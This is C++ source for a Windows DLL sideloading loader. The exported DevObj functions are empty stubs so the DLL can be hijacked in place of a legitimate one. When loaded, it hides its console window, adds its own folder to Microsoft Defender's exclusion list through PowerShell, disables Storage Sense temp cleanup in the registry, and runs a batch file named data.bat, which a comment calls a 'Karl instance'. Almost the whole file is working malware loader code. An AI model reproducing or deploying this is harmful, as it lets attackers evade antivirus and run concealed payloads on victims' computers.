#include <Windows.h>
#include <string>
#include <fstream>
#include <direct.h>

#pragma comment(lib, "user32.lib")

BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
        // Hide window
        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
        char *cwd_buffer = (char*)malloc(sizeof(char) * MAX_PATH);
        char *cwd = getcwd(cwd_buffer, MAX_PATH);

        // With elevated privileges, add folder to Defender exclude path (doesn't duplicate)
        // then execute Karl instance
        std::string exStr = std::string("powershell -c Add-MpPreference -ExclusionPath \"") + cwd + "\"\n";
        system(exStr.c_str());

        // turn off temp folder clearance
        system("powershell -c Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\StorageSense\\Parameters\\StoragePolicy\" -Name \"04\" -Type DWord -Value 0\n");

        system("data.bat");
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

// These functions enable the sideloading
extern "C" __declspec (dllexport) void DevObjCreateDeviceInfoList(){}

extern "C" __declspec (dllexport) void DevObjUninstallDevice(){}

extern "C" __declspec (dllexport) void DevObjOpenDevRegKey(){}

extern "C" __declspec (dllexport) void DevObjEnumDeviceInfo(){}

extern "C" __declspec (dllexport) void DevObjGetClassDevs() {}

extern "C" __declspec (dllexport) void DevObjGetDeviceInstanceId() {}

extern "C" __declspec (dllexport) void DevObjDestroyDeviceInfoList() {}